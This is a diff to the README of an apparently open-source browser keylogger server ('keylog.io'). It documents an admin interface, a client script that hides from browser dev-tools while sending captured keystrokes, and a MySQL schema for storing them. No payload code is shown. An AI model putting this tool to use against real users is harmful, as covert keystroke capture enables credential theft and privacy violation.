@@ -2,13 +2,15 @@
 
 > A express/socketio keylogger server with administrator interface
 
-#### Backend
+![Admin Interface](screenshot.png)
+
+### Backend
 The backend consist of an [expressjs](https://expressjs.com/) webserver which serves the administrator interface using __Basic HTTP Authentication__ customizable from the options and a [socket.io](https://socket.io/) server wait and handle the receiving of key logs from various sources, stores them and forward them to the administrator interface for be seen and analyzed.
 
-#### Interface
+### Interface
 The administrator interface for visualize the key logs archive and the live key logs feed from various clients is built with Angular using [Angular CLI](https://github.com/angular/angular-cli) version 1.6.6. The administrator interface comes with a basic HTTP authorization which defaults to: `keylog-io`
 
-#### Client script
+### Client script
 The client script is a socketio.io client with key logger functions that try to hide himself by pausing when the dev-tools (inspector) is open. It catches only relevant keys and send them back to the server as a buffer with additional information, take a look at the [code](lib/client.js) if you want to see more.
 
 ---
@@ -107,9 +109,11 @@ For a full list of options see the [default](lib/index.js#L27-L49) options on so
 
 ## Database
 
-If you want to use the MySQL database to __persist the keylog entries__ across time when used multiple times or for using the
-archive page to analyze your findings later using the filters, you must setup a table called __keylogs__, the suggested
-table structure is the following but you can adapt the sized to your needs or suggest a more optimized structure. You can customize the database name using the `database` options property which is an object that let you configure the details of the connection to your MySQL instance.
+If you want to __persist the keylog entries__ across time or for using the archive page to analyze your findings later, using the filters and more, you must have a __working MySQL instance__ with a database containing one table called __keylogs__. You can customize the database name using the `database.name` option when starting the server.
+
+#### Table structure
+
+The default table structure suggested is the following but you can adapt the sizing to your needs or suggest a more optimized structure by opening a new issue.
 
 ```sql
 CREATE TABLE `keylogs` (
@@ -129,6 +133,8 @@ ALTER TABLE `keylogs`
   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 COMMIT;
 ```
+
+You can also link a database using [docker links](https://docs.docker.com/network/links/) if you are using __keylog.io__ from a container.
 
 ---
 
